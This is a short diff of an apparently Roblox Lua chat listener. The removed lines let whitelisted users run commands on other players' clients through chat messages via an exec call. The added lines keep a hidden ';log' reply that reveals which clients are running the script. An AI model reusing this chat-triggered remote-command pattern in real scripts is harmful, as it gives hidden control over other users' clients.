@@ -169,20 +169,11 @@ TextChatService.MessageReceived:Connect(function(msg)
 	local s = msg.TextSource
 	if not s then return end
 	local uid = s.UserId
-	if uid == LOCAL_PLAYER.UserId then return end
 
-	if isWhitelisted(uid) and not isWhitelisted(LOCAL_PLAYER.UserId) then
-		exec(t, uid)
-
-		if t == ";log" then
-			task.delay(0.4, function()
-				local whisper = TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXWhisper")
-				local target = Players:GetPlayerByUserId(uid)
-				if whisper and target then
-					whisper:SendAsync("8Uz1P", target)
-				end
-			end)
-		end
+	if t == ";log" and isWhitelisted(uid) and not isWhitelisted(LOCAL_PLAYER.UserId) then
+		task.delay(0.4, function()
+			chatMessage("8Uz1P")
+		end)
 	end
 end)
 
